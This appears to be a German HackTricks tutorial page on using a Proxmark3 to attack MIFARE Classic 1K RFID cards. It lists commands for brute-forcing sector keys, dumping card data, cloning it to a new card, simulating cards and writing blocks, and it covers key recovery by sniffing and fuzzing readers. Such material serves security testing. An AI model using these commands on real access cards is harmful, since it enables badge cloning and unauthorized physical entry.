# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Angreifen von RFID-Systemen mit Proxmark3

Das erste, was Sie tun müssen, ist, einen [**Proxmark3**](https://proxmark.com) zu haben und [**die Software und ihre Abhängigkeiten zu installieren**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Angreifen von MIFARE Classic 1KB

Es hat **16 Sektoren**, jeder von ihnen hat **4 Blöcke** und jeder Block enthält **16B**. Die UID befindet sich im Sektor 0 Block 0 (und kann nicht geändert werden).\
Um auf jeden Sektor zuzugreifen, benötigen Sie **2 Schlüssel** (**A** und **B**), die in **Block 3 jedes Sektors** gespeichert sind (Sektortrailer). Der Sektortrailer speichert auch die **Zugriffsbits**, die die **Lese- und Schreib**berechtigungen für **jeden Block** mit den 2 Schlüsseln geben.\
2 Schlüssel sind nützlich, um Berechtigungen zum Lesen zu geben, wenn Sie den ersten kennen, und zum Schreiben, wenn Sie den zweiten kennen (zum Beispiel).

Es können mehrere Angriffe durchgeführt werden
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Der Proxmark3 ermöglicht es, andere Aktionen wie das **Abhören** einer **Tag-zu-Reader-Kommunikation** durchzuführen, um zu versuchen, sensible Daten zu finden. In dieser Karte könnten Sie einfach die Kommunikation sniffen und den verwendeten Schlüssel berechnen, da die **verwendeten kryptografischen Operationen schwach sind** und Sie mit dem Klartext und dem Chiffretext diesen berechnen können (`mfkey64` Tool).

### Rohbefehle

IoT-Systeme verwenden manchmal **nicht markierte oder nicht kommerzielle Tags**. In diesem Fall können Sie Proxmark3 verwenden, um benutzerdefinierte **Rohbefehle an die Tags** zu senden.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Mit diesen Informationen könnten Sie versuchen, Informationen über die Karte und die Art der Kommunikation mit ihr zu suchen. Proxmark3 ermöglicht das Senden von Rohbefehlen wie: `hf 14a raw -p -b 7 26`

### Skripte

Die Proxmark3-Software wird mit einer vorinstallierten Liste von **Automatisierungsskripten** geliefert, die Sie verwenden können, um einfache Aufgaben auszuführen. Um die vollständige Liste abzurufen, verwenden Sie den Befehl `script list`. Verwenden Sie anschließend den Befehl `script run`, gefolgt vom Namen des Skripts:
```
proxmark3> script run mfkeys
```
Sie können ein Skript erstellen, um **Tag-Leser** zu **fuzzern**, indem Sie die Daten einer **gültigen Karte** kopieren. Schreiben Sie einfach ein **Lua-Skript**, das ein oder mehrere zufällige **Bytes** **randomisiert** und überprüft, ob der **Leser bei einer Iteration abstürzt**. 

{{#include ../../banners/hacktricks-training.md}}
